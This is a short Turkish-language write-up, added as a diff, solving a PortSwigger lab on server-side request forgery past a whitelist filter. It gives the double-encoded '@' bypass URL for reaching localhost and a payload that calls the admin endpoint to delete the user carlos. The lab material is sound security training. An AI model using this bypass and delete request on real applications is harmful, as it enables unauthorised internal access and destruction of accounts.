@@ -1,0 +1,18 @@
+Lab: SSRF with whitelist-based input filter
+
+url: https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter
+
+
+Analiz:
+
+locahost değeri http://localhost%2523@stock.weliketoshop.net ile erişilebiliyor
+admin paneline erişmek için ise http://localhost%2523@stock.weliketoshop.net/admin
+
+
+Payload:
+
+http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos erişimi ile tüm sorunlar çözülüyor
+
+Sonuç:
+
+carlos silindi.
